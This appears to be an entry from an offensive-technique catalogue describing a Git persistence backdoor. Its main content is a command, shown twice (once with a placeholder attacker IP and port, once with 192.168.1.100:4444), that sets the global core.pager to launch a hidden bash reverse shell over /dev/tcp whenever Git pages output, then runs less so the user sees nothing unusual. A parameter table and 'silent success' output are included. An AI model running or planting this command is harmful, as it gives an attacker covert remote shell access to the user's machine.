---
type: command
executor: bash
data: >-
  git config --global core.pager 'nohup bash -c "bash -i >&
  /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & less -F -X'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - git
  - persistence
  - backdoor
verified: true
validated: true
---

# git-config-set-core-pager

## Command

```bash
git config --global core.pager 'nohup bash -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & less -F -X'
```

## Description

Configures Git's global pager to run a backdoor on output paging, triggering during commands like git log.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--global` | User-wide | Yes |
| `core.pager` | Pager command key | Yes |
| `$_ATTACKER_IP` | Attacker IP | Yes |
| `$_BACKDOOR_PORT` | Connection port | Yes |

## Examples

### Basic Usage

```bash
git config --global core.pager 'nohup bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >/dev/null 2>&1 & less'
```

## Expected Output

Silent success.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
